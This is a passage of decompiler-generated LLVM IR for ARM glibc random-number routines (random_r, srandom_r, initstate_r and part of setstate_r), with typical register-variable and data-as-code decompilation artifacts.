  %v3_bb28 = load i32, i32* @r4, align 4
  store i32 %v3_bb28, i32* %stack_var_-20, align 4
  %v2_bb2c = icmp eq i32 %v3_bb24, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_bb2c, label %.thread7, label %.thread8

.thread7:                                         ; preds = %entry
  %v1_bb381 = add i32 %tmp, 8
  %v2_bb382 = inttoptr i32 %v1_bb381 to i32*
  %v3_bb383 = load i32, i32* %v2_bb382, align 4
  store i32 %v3_bb383, i32* %r1.global-to-local, align 4
  %v3_bb4c = add i32 %v3_bb383, -4
  %v4_bb4c = inttoptr i32 %v3_bb4c to i32*
  store i32 0, i32* %v4_bb4c, align 4
  br label %bb

.thread8:                                         ; preds = %entry
  %v2_bb34 = add i32 %tmp, 4
  %v3_bb34 = inttoptr i32 %v2_bb34 to i32*
  %v4_bb34 = load i32, i32* %v3_bb34, align 4
  %v1_bb38 = add i32 %tmp, 8
  %v2_bb38 = inttoptr i32 %v1_bb38 to i32*
  %v3_bb38 = load i32, i32* %v2_bb38, align 4
  store i32 %v3_bb38, i32* %r1.global-to-local, align 4
  %v3_bb3c = sub i32 %v4_bb34, %v3_bb38
  %v4_bb40 = sdiv i32 %v3_bb3c, 4
  %v4_bb48 = mul i32 %v4_bb40, 5
  %v5_bb48 = add i32 %v4_bb48, %v3_bb24
  %v3_bb50 = add i32 %v3_bb38, -4
  %v4_bb50 = inttoptr i32 %v3_bb50 to i32*
  store i32 %v5_bb48, i32* %v4_bb50, align 4
  br label %bb

bb:                                               ; preds = %.thread7, %.thread8
  %v1_bb54 = add i32 %arg1, 4
  store i32 %v1_bb54, i32* %r6.global-to-local, align 4
  %v2_bb58 = inttoptr i32 %arg1 to i32*
  %v3_bb58 = load i32, i32* %v2_bb58, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_bb60 = srem i32 %v3_bb58, 5
  store i32 %v2_bb60, i32* %r0.global-to-local, align 4
  %v2_bb6c = and i32 %v2_bb60, 1073741824
  %v3_bb6c = icmp ne i32 %v2_bb6c, 0
  %v4_bb6c = mul nsw i32 %v2_bb60, 4
  %v2_bb70 = icmp ne i32 %v2_bb60, 4
  %v3_bb70 = and i1 %v3_bb6c, %v2_bb70
  br i1 %v3_bb70, label %dec_label_pc_bbcc, label %dec_label_pc_bb74

dec_label_pc_bb74:                                ; preds = %bb
  %v5_bb6c = add i32 %v4_bb6c, ptrtoint (i32* @global_var_12488.156 to i32)
  %v1_bb74 = add i32 %v4_bb6c, add (i32 ptrtoint (i32* @global_var_12488.156 to i32), i32 20)
  %v2_bb74 = inttoptr i32 %v1_bb74 to i32*
  %v3_bb74 = load i32, i32* %v2_bb74, align 4
  store i32 %v3_bb74, i32* %r5.global-to-local, align 4
  %v6_bb78 = inttoptr i32 %v5_bb6c to i32*
  %v7_bb78 = load i32, i32* %v6_bb78, align 4
  store i32 %v7_bb78, i32* %r7.global-to-local, align 4
  %v2_bb7c = icmp eq i32 %v2_bb60, 0
  store i32 5, i32* %r1.global-to-local, align 4
  %v1_bb84 = load i32, i32* %r4.global-to-local, align 4
  %v2_bb84 = add i32 %v1_bb84, 16
  %v3_bb84 = inttoptr i32 %v2_bb84 to i32*
  store i32 %v3_bb74, i32* %v3_bb84, align 4
  %v0_bb88 = load i32, i32* %r7.global-to-local, align 4
  %v1_bb88 = load i32, i32* %r4.global-to-local, align 4
  %v2_bb88 = add i32 %v1_bb88, 20
  %v3_bb88 = inttoptr i32 %v2_bb88 to i32*
  store i32 %v0_bb88, i32* %v3_bb88, align 4
  %v0_bb8c = load i32, i32* %r0.global-to-local, align 4
  %v1_bb8c = load i32, i32* %r4.global-to-local, align 4
  %v2_bb8c = add i32 %v1_bb8c, 12
  %v3_bb8c = inttoptr i32 %v2_bb8c to i32*
  store i32 %v0_bb8c, i32* %v3_bb8c, align 4
  br i1 %v2_bb7c, label %dec_label_pc_bbb8, label %dec_label_pc_bb94

dec_label_pc_bb94:                                ; preds = %dec_label_pc_bb74
  %v0_bb94 = load i32, i32* %r6.global-to-local, align 4
  %v1_bb94 = add i32 %v0_bb94, -4
  %v2_bb94 = inttoptr i32 %v1_bb94 to i32*
  %v3_bb94 = load i32, i32* %v2_bb94, align 4
  %v1_bb98 = load i32, i32* %r1.global-to-local, align 4
  %v2_bb98 = sdiv i32 %v3_bb94, %v1_bb98
  store i32 %v2_bb98, i32* %r0.global-to-local, align 4
  %v4_bb9c = mul i32 %v2_bb98, 4
  %v5_bb9c = add i32 %v4_bb9c, %v0_bb94
  %v1_bba0 = load i32, i32* %r4.global-to-local, align 4
  %v2_bba0 = add i32 %v1_bba0, 4
  %v3_bba0 = inttoptr i32 %v2_bba0 to i32*
  store i32 %v5_bb9c, i32* %v3_bba0, align 4
  %v0_bba4 = load i32, i32* %r0.global-to-local, align 4
  %v1_bba4 = load i32, i32* %r7.global-to-local, align 4
  %v2_bba4 = add i32 %v1_bba4, %v0_bba4
  %v0_bba8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_bba8, i32* %r1.global-to-local, align 4
  %v2_bbac = srem i32 %v2_bba4, %v0_bba8
  %v0_bbb0 = load i32, i32* %r6.global-to-local, align 4
  %v4_bbb0 = mul i32 %v2_bbac, 4
  %v5_bbb0 = add i32 %v0_bbb0, %v4_bbb0
  store i32 %v5_bbb0, i32* %r0.global-to-local, align 4
  %v1_bbb4 = load i32, i32* %r4.global-to-local, align 4
  %v2_bbb4 = inttoptr i32 %v1_bbb4 to i32*
  store i32 %v5_bbb0, i32* %v2_bbb4, align 4
  br label %dec_label_pc_bbb8

dec_label_pc_bbb8:                                ; preds = %dec_label_pc_bb74, %dec_label_pc_bb94
  %v0_bbb8 = load i32, i32* %r6.global-to-local, align 4
  %v1_bbb8 = load i32, i32* %r5.global-to-local, align 4
  %v4_bbb8 = mul i32 %v1_bbb8, 4
  %v5_bbb8 = add i32 %v4_bbb8, %v0_bbb8
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_bbc0 = load i32, i32* %r4.global-to-local, align 4
  %v2_bbc0 = add i32 %v1_bbc0, 24
  %v3_bbc0 = inttoptr i32 %v2_bbc0 to i32*
  store i32 %v5_bbb8, i32* %v3_bbc0, align 4
  %v0_bbc4 = load i32, i32* %r6.global-to-local, align 4
  %v1_bbc4 = load i32, i32* %r4.global-to-local, align 4
  %v2_bbc4 = add i32 %v1_bbc4, 8
  %v3_bbc4 = inttoptr i32 %v2_bbc4 to i32*
  store i32 %v0_bbc4, i32* %v3_bbc4, align 4
  %v2_bbc8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_bbc8, i32* %r4.global-to-local, align 4
  ret i32 0

dec_label_pc_bbcc:                                ; preds = %bb
  %v0_bbcc = call i32 @__errno_location()
  %v2_bbd4 = inttoptr i32 %v0_bbcc to i32*
  store i32 22, i32* %v2_bbd4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_bbdc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_bbdc, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v2_bb60, { 1, 0, 3, 2, 4 }
  uselistorder i32 %tmp, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 3, 4, 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bbb8, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_bbe4 = add i32 %tmp, 12
  %v2_bbe4 = inttoptr i32 %v1_bbe4 to i32*
  %v3_bbe4 = load i32, i32* %v2_bbe4, align 4
  store i32 %v3_bbe4, i32* %r3.global-to-local, align 4
  %v2_bbe8 = icmp eq i32 %v3_bbe4, 0
  %v3_bbec = load i32, i32* @r4, align 4
  store i32 %v3_bbec, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* @ip, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_bbf8 = add i32 %tmp, 8
  %v2_bbf8 = inttoptr i32 %v1_bbf8 to i32*
  %v3_bbf8 = load i32, i32* %v2_bbf8, align 4
  store i32 %v3_bbf8, i32* %lr.global-to-local, align 4
  br i1 %v2_bbe8, label %dec_label_pc_bc00, label %dec_label_pc_bc24

dec_label_pc_bc00:                                ; preds = %entry
  %v1_bc00 = inttoptr i32 %v3_bbf8 to i32*
  %v2_bc00 = load i32, i32* %v1_bc00, align 4
  store i32 %v2_bc00, i32* %r2.global-to-local, align 4
  %v2_bc08 = mul i32 %v2_bc00, 1103515245
  %v1_bc10 = add i32 %v2_bc08, 12345
  %tmp10 = bitcast i32 %v1_bc10 to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_bc14 = bitcast float %tmp11 to i32
  store i32 %v1_bc14, i32* %r3.global-to-local, align 4
  store i32 %v1_bc14, i32* %v1_bc00, align 4
  %v0_bc1c = load i32, i32* %r3.global-to-local, align 4
  %v2_bc1c = inttoptr i32 %arg2 to i32*
  store i32 %v0_bc1c, i32* %v2_bc1c, align 4
  br label %dec_label_pc_bc68

dec_label_pc_bc24:                                ; preds = %entry
  %v2_bc24 = load i32, i32* %arg1, align 4
  store i32 %v2_bc24, i32* %r2.global-to-local, align 4
  %v1_bc28 = add i32 %tmp, 4
  %v2_bc28 = inttoptr i32 %v1_bc28 to i32*
  %v3_bc28 = load i32, i32* %v2_bc28, align 4
  store i32 %v3_bc28, i32* %r0.global-to-local, align 4
  %v1_bc2c = inttoptr i32 %v2_bc24 to i32*
  %v2_bc2c = load i32, i32* %v1_bc2c, align 4
  store i32 %v2_bc2c, i32* %r3.global-to-local, align 4
  %v1_bc30 = inttoptr i32 %v3_bc28 to i32*
  %v2_bc30 = load i32, i32* %v1_bc30, align 4
  %v4_bc30 = add i32 %v3_bc28, 4
  store i32 %v4_bc30, i32* %r0.global-to-local, align 4
  %v2_bc34 = add i32 %v2_bc30, %v2_bc2c
  store i32 %v2_bc34, i32* %r3.global-to-local, align 4
  store i32 %v2_bc34, i32* %v1_bc2c, align 4
  %v3_bc38 = load i32, i32* %r2.global-to-local, align 4
  %v4_bc38 = add i32 %v3_bc38, 4
  store i32 %v4_bc38, i32* %r2.global-to-local, align 4
  %v0_bc3c = load i32, i32* @ip, align 4
  %v1_bc3c = add i32 %v0_bc3c, 24
  %v2_bc3c = inttoptr i32 %v1_bc3c to i32*
  %v3_bc3c = load i32, i32* %v2_bc3c, align 4
  store i32 %v3_bc3c, i32* %r4.global-to-local, align 4
  %v0_bc40 = load i32, i32* %r3.global-to-local, align 4
  %v3_bc40 = udiv i32 %v0_bc40, 2
  store i32 %v3_bc40, i32* %r3.global-to-local, align 4
  %v3_bc44 = icmp ult i32 %v4_bc38, %v3_bc3c
  %v1_bc48 = load i32, i32* %r5.global-to-local, align 4
  %v2_bc48 = inttoptr i32 %v1_bc48 to i32*
  store i32 %v3_bc40, i32* %v2_bc48, align 4
  br i1 %v3_bc44, label %dec_label_pc_bc58, label %bb

bb:                                               ; preds = %dec_label_pc_bc24
  %v1_bc4c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_bc4c, i32* %r2.global-to-local, align 4
  %v0_bc50 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_bc50, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_bc58:                                ; preds = %dec_label_pc_bc24
  %v0_bc501 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_bc501, i32* %r3.global-to-local, align 4
  %v1_bc58 = load i32, i32* %r4.global-to-local, align 4
  %v3_bc58 = icmp ult i32 %v0_bc501, %v1_bc58
  br i1 %v3_bc58, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_bc58
  store i32 %v0_bc501, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_bc58
  %v1_bc60 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_bc60, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_bc64 = load i32, i32* @ip, align 4
  %v1_bc64 = inttoptr i32 %v0_bc64 to i32*
  %v2_bc64 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_bc64, i32* %v1_bc64, align 4
  %v3_bc64 = add i32 %v0_bc64, 4
  %v4_bc64 = inttoptr i32 %v3_bc64 to i32*
  %v5_bc64 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_bc64, i32* %v4_bc64, align 4
  br label %dec_label_pc_bc68

dec_label_pc_bc68:                                ; preds = %dec_label_pc_bc00, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_bc6c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_bc6c, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_bc501, { 1, 0, 2 }
  uselistorder i32 %v3_bc40, { 1, 0 }
  uselistorder i32 %v1_bc14, { 1, 0 }
  uselistorder i32 %tmp, { 1, 3, 2, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder label %dec_label_pc_bc68, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_bc74 = load i32, i32* @r4, align 4
  store i32 %v3_bc74, i32* %stack_var_-32, align 4
  %v6_bc74 = load i32, i32* @r5, align 4
  %v1_bc78 = add i32 %tmp, 12
  %v2_bc78 = inttoptr i32 %v1_bc78 to i32*
  %v3_bc78 = load i32, i32* %v2_bc78, align 4
  %v2_bc80 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp29 = icmp ugt i32 %v3_bc78, 4
  br i1 %tmp29, label %.dec_label_pc_bd2c_crit_edge, label %dec_label_pc_bc90

.dec_label_pc_bd2c_crit_edge:                     ; preds = %entry
  br label %dec_label_pc_bd2c

dec_label_pc_bc90:                                ; preds = %entry
  %v0_bc90 = load i32, i32* @r0, align 4
  %v2_bc90 = icmp eq i32 %v0_bc90, 0
  %v1_bc94 = add i32 %tmp, 8
  %v2_bc94 = inttoptr i32 %v1_bc94 to i32*
  %v3_bc94 = load i32, i32* %v2_bc94, align 4
  store i32 %v3_bc94, i32* %r7.global-to-local, align 4
  br i1 %v2_bc90, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_bc90
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_bc90, %bb
  %v0_bca0 = phi i32 [ %v0_bc90, %dec_label_pc_bc90 ], [ 1, %bb ]
  %v2_bc9c = icmp eq i32 %v3_bc78, 0
  %v2_bca0 = inttoptr i32 %v3_bc94 to i32*
  store i32 %v0_bca0, i32* %v2_bca0, align 4
  br i1 %v2_bc9c, label %dec_label_pc_bd28, label %dec_label_pc_bca8

dec_label_pc_bca8:                                ; preds = %bb21
  %v1_bca8 = add i32 %tmp, 16
  %v2_bca8 = inttoptr i32 %v1_bca8 to i32*
  %v3_bca8 = load i32, i32* %v2_bca8, align 4
  store i32 %v3_bca8, i32* %sb.global-to-local, align 4
  %v0_bcac = load i32, i32* @r0, align 4
  %v0_bcb0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_bcb0, i32* %sl.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  %v5_bcf823 = icmp sgt i32 %v3_bca8, 1
  br i1 %v5_bcf823, label %dec_label_pc_bcbc, label %dec_label_pc_bcfc

dec_label_pc_bcbc:                                ; preds = %dec_label_pc_bca8, %dec_label_pc_bcbc
  %v0_bccc25 = phi i32 [ %v0_bcec.pre, %dec_label_pc_bcbc ], [ %v0_bcac, %dec_label_pc_bca8 ]
  %v1_bce424 = phi i32 [ %v5_bce4, %dec_label_pc_bcbc ], [ %v0_bcb0, %dec_label_pc_bca8 ]
  %v2_bcbc = srem i32 %v0_bccc25, 127773
  %v2_bcc8 = mul i32 %v2_bcbc, 16807
  %v2_bcd0 = sdiv i32 %v0_bccc25, 127773
  %tmp30 = mul nsw i32 %v2_bcd0, -2836
  %v2_bcdc = add i32 %v2_bcc8, %tmp30
  %v8_bcdc = icmp slt i32 %v2_bcdc, 0
  %v2_bce0 = add i32 %v2_bcdc, 2147483647
  %v2_bce0.v2_bcdc = select i1 %v8_bcdc, i32 %v2_bce0, i32 %v2_bcdc
  store i32 %v2_bce0.v2_bcdc, i32* @r5, align 4
  %v2_bce4 = add i32 %v1_bce424, 4
  %v3_bce4 = inttoptr i32 %v2_bce4 to i32*
  store i32 %v2_bce0.v2_bcdc, i32* %v3_bce4, align 4
  %v4_bce4 = load i32, i32* %sl.global-to-local, align 4
  %v5_bce4 = add i32 %v4_bce4, 4
  store i32 %v5_bce4, i32* %sl.global-to-local, align 4
  %v0_bce8.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_bce8.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_bcec.pre = load i32, i32* @r5, align 4
  %v1_bcf4 = add i32 %v0_bce8.pre, 1
  store i32 %v1_bcf4, i32* %r8.global-to-local, align 4
  %v5_bcf8 = icmp slt i32 %v0_bce8.pre, %v1_bce8.pre
  br i1 %v5_bcf8, label %dec_label_pc_bcbc, label %dec_label_pc_bce8.dec_label_pc_bcfc_crit_edge

dec_label_pc_bce8.dec_label_pc_bcfc_crit_edge:    ; preds = %dec_label_pc_bcbc
  %v0_bd08.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_bcfc

dec_label_pc_bcfc:                                ; preds = %dec_label_pc_bce8.dec_label_pc_bcfc_crit_edge, %dec_label_pc_bca8
  %v0_bd08 = phi i32 [ %v0_bd08.pre, %dec_label_pc_bce8.dec_label_pc_bcfc_crit_edge ], [ %v0_bcb0, %dec_label_pc_bca8 ]
  %v0_bd00.lcssa = phi i32 [ %v1_bce8.pre, %dec_label_pc_bce8.dec_label_pc_bcfc_crit_edge ], [ %v3_bca8, %dec_label_pc_bca8 ]
  %v2_bd00 = mul i32 %v0_bd00.lcssa, 10
  store i32 %v2_bd00, i32* @r4, align 4
  %v0_bd04 = load i32, i32* %r6.global-to-local, align 4
  %v1_bd04 = add i32 %v0_bd04, 20
  %v2_bd04 = inttoptr i32 %v1_bd04 to i32*
  %v3_bd04 = load i32, i32* %v2_bd04, align 4
  %v4_bd08 = mul i32 %v3_bd04, 4
  %v5_bd08 = add i32 %v0_bd08, %v4_bd08
  %v1_bd0c = inttoptr i32 %v0_bd04 to i32*
  store i32 %v5_bd08, i32* %v1_bd0c, align 4
  %v3_bd0c = add i32 %v0_bd04, 4
  %v4_bd0c = inttoptr i32 %v3_bd0c to i32*
  %v5_bd0c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_bd0c, i32* %v4_bd0c, align 4
  br label %dec_label_pc_bd18

dec_label_pc_bd14:                                ; preds = %dec_label_pc_bd18
  %v0_bd1c = load i32, i32* %r6.global-to-local, align 4
  %v2_bd14 = inttoptr i32 %v0_bd1c to i32*
  %v3_bd14 = call i32 @__GI_random_r(i32* %v2_bd14, i32 %v2_bc80)
  br label %dec_label_pc_bd18

dec_label_pc_bd18:                                ; preds = %dec_label_pc_bcfc, %dec_label_pc_bd14
  %v0_bd18 = load i32, i32* @r4, align 4
  %v1_bd18 = add i32 %v0_bd18, -1
  store i32 %v1_bd18, i32* @r4, align 4
  %v6_bd18 = icmp slt i32 %v1_bd18, 0
  br i1 %v6_bd18, label %dec_label_pc_bd28, label %dec_label_pc_bd14

dec_label_pc_bd28:                                ; preds = %dec_label_pc_bd18, %bb21
  %v2_bd30.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_bd2c

dec_label_pc_bd2c:                                ; preds = %.dec_label_pc_bd2c_crit_edge, %dec_label_pc_bd28
  %v2_bd30 = phi i32 [ %v3_bc74, %.dec_label_pc_bd2c_crit_edge ], [ %v2_bd30.pre, %dec_label_pc_bd28 ]
  %v26_bd30 = phi i32 [ -1, %.dec_label_pc_bd2c_crit_edge ], [ 0, %dec_label_pc_bd28 ]
  store i32 %v2_bd30, i32* @r4, align 4
  store i32 %v6_bc74, i32* @r5, align 4
  ret i32 %v26_bd30

; uselistorder directives
  uselistorder i32 %v1_bd18, { 1, 0 }
  uselistorder i32 %v0_bd04, { 1, 0, 2 }
  uselistorder i32 %v0_bce8.pre, { 1, 0 }
  uselistorder i32 %v5_bce4, { 1, 0 }
  uselistorder i32 %v2_bcdc, { 2, 1, 0 }
  uselistorder i32 %v0_bccc25, { 1, 0 }
  uselistorder i32 %v0_bcb0, { 1, 0, 2 }
  uselistorder i32 %v3_bca8, { 1, 0, 2 }
  uselistorder i32 %v3_bc78, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 3, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 (i32*, i32)* @__GI_random_r, { 1, 0 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_bd2c, { 1, 0 }
  uselistorder label %dec_label_pc_bd18, { 1, 0 }
  uselistorder label %dec_label_pc_bcbc, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_bd34:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_bd34 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_bd34, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_bd34
  %v2_bd34 = load i32, i32* @r7, align 4
  %v5_bd34 = udiv i32 %v2_bd34, 8
  %v6_bd34 = and i32 %v5_bd34, %arg1
  store i32 %v6_bd34, i32* %r4.global-to-local, align 4
  %v2_bd38 = load i32, i32* @sp, align 4
  %v8_bd38 = shl i32 %v2_bd38, %arg3
  %v9_bd38 = and i32 %v8_bd38, %arg2
  call void @__pseudo_branch(i32 %v9_bd38)
  %v0_bd3c.pr.pr = load i1, i1* @cpsr_z, align 1
  %v1_bd3c = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_bd3c.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v2_bd3c = load i32, i32* %r4.global-to-local, align 4
  %v3_bd3c = load i32, i32* @fp, align 4
  %v8_bd3c = shl i32 %v2_bd3c, %v3_bd3c
  %v9_bd3c = and i32 %v8_bd3c, %v1_bd3c
  store i32 %v9_bd3c, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread, %dec_label_pc_bd34, %bb
  %v10_bd3c = phi i32 [ %arg1, %dec_label_pc_bd34 ], [ %v9_bd3c, %bb ], [ %v1_bd3c, %.thread ]
  ret i32 %v10_bd3c

; uselistorder directives
  uselistorder i32 %v1_bd3c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 2, 0, 1 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_bd44 = load i32, i32* @r4, align 4
  store i32 %v3_bd44, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_bd64, label %dec_label_pc_bd54

dec_label_pc_bd54:                                ; preds = %entry
  %v2_bd54 = icmp ugt i32 %arg2, 254
  %v7_bd54 = icmp eq i32 %arg2, 255
  %v2_bd58 = xor i1 %v7_bd54, true
  %v3_bd58 = and i1 %v2_bd54, %v2_bd58
  br i1 %v3_bd58, label %bb, label %bb20

bb:                                               ; preds = %dec_label_pc_bd54
  store i32 4, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_bd54, %bb
  %v1_bd8c7 = phi i32 [ %v3_bd44, %dec_label_pc_bd54 ], [ 4, %bb ]
  %v2_bd5c = xor i1 %v2_bd54, true
  %v3_bd5c = or i1 %v7_bd54, %v2_bd5c
  br i1 %v3_bd5c, label %bb21, label %bb25

bb21:                                             ; preds = %bb20
  store i32 3, i32* @r4, align 4
  br label %bb25

dec_label_pc_bd64:                                ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_bd7c, label %dec_label_pc_bd6c

dec_label_pc_bd6c:                                ; preds = %dec_label_pc_bd64
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_bde8

.thread10:                                        ; preds = %dec_label_pc_bd6c
  store i32 0, i32* @r4, align 4
  br label %bb25

dec_label_pc_bd7c:                                ; preds = %dec_label_pc_bd64
  %v2_bd7c = icmp ugt i32 %arg2, 62
  %v7_bd7c = icmp eq i32 %arg2, 63
  %v2_bd80 = xor i1 %v7_bd7c, true
  %v3_bd80 = and i1 %v2_bd7c, %v2_bd80
  br i1 %v3_bd80, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_bd7c
  store i32 2, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_bd7c, %bb22
  %v1_bd8c6 = phi i32 [ %v3_bd44, %dec_label_pc_bd7c ], [ 2, %bb22 ]
  %v2_bd84 = xor i1 %v2_bd7c, true
  %v3_bd84 = or i1 %v7_bd7c, %v2_bd84
  br i1 %v3_bd84, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  store i32 1, i32* @r4, align 4
  br label %bb25

bb25:                                             ; preds = %.thread10, %bb21, %bb20, %bb23, %bb24
  %v1_bd94 = phi i32 [ 3, %bb21 ], [ %v1_bd8c7, %bb20 ], [ %v1_bd8c6, %bb23 ], [ 1, %bb24 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_12488.156 to i32), i32* %r2.global-to-local, align 4
  %v4_bd8c = mul i32 %v1_bd94, 4
  %v5_bd8c = add i32 %v4_bd8c, ptrtoint (i32* @global_var_12488.156 to i32)
  store i32 %v5_bd8c, i32* %r3.global-to-local, align 4
  %v1_bd90 = add i32 %v4_bd8c, add (i32 ptrtoint (i32* @global_var_12488.156 to i32), i32 20)
  %v2_bd90 = inttoptr i32 %v1_bd90 to i32*
  %v3_bd90 = load i32, i32* %v2_bd90, align 4
  store i32 %v3_bd90, i32* %r1.global-to-local, align 4
  %v6_bd94 = inttoptr i32 %v5_bd8c to i32*
  %v7_bd94 = load i32, i32* %v6_bd94, align 4
  store i32 %v7_bd94, i32* %r2.global-to-local, align 4
  %v1_bd98 = add i32 %tmp, 4
  store i32 %v1_bd98, i32* @r6, align 4
  %v4_bd9c = mul i32 %v3_bd90, 4
  %v5_bd9c = add i32 %v4_bd9c, %v1_bd98
  store i32 %v5_bd9c, i32* %r3.global-to-local, align 4
  %v2_bda0 = add i32 %arg3, 24
  %v3_bda0 = inttoptr i32 %v2_bda0 to i32*
  store i32 %v5_bd9c, i32* %v3_bda0, align 4
  %v0_bda4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bda4 = load i32, i32* @r5, align 4
  %v2_bda4 = add i32 %v1_bda4, 20
  %v3_bda4 = inttoptr i32 %v2_bda4 to i32*
  store i32 %v0_bda4, i32* %v3_bda4, align 4
  %v0_bda8 = load i32, i32* %r1.global-to-local, align 4
  %v1_bda8 = load i32, i32* @r5, align 4
  %v2_bda8 = add i32 %v1_bda8, 16
  %v3_bda8 = inttoptr i32 %v2_bda8 to i32*
  store i32 %v0_bda8, i32* %v3_bda8, align 4
  %v0_bdac = load i32, i32* @r4, align 4
  %v1_bdac = load i32, i32* @r5, align 4
  %v2_bdac = add i32 %v1_bdac, 12
  %v3_bdac = inttoptr i32 %v2_bdac to i32*
  store i32 %v0_bdac, i32* %v3_bdac, align 4
  %v0_bdb0 = load i32, i32* @r6, align 4
  %v1_bdb0 = load i32, i32* @r5, align 4
  %v2_bdb0 = add i32 %v1_bdb0, 8
  %v3_bdb0 = inttoptr i32 %v2_bdb0 to i32*
